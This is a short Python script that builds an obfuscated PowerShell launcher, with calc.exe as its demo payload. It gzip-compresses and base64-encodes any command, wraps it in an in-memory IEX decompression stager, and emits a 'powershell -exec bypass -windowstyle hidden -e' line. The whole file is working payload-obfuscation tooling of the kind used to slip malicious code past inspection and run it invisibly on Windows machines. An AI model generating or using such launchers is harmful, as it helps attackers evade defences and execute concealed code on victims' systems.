import gzip
from io import StringIO
import base64

def test(code_to_execute):
    out = StringIO()
    data = bytes(code_to_execute, 'utf-8')
    out = gzip.compress(data)
    gzipdata = base64.b64encode(out).decode("utf-8")
    b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
    encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")
    batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % encodedPayload
    # return base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")
    return batfile

code_to_execute = 'calc.exe'

print(test(code_to_execute))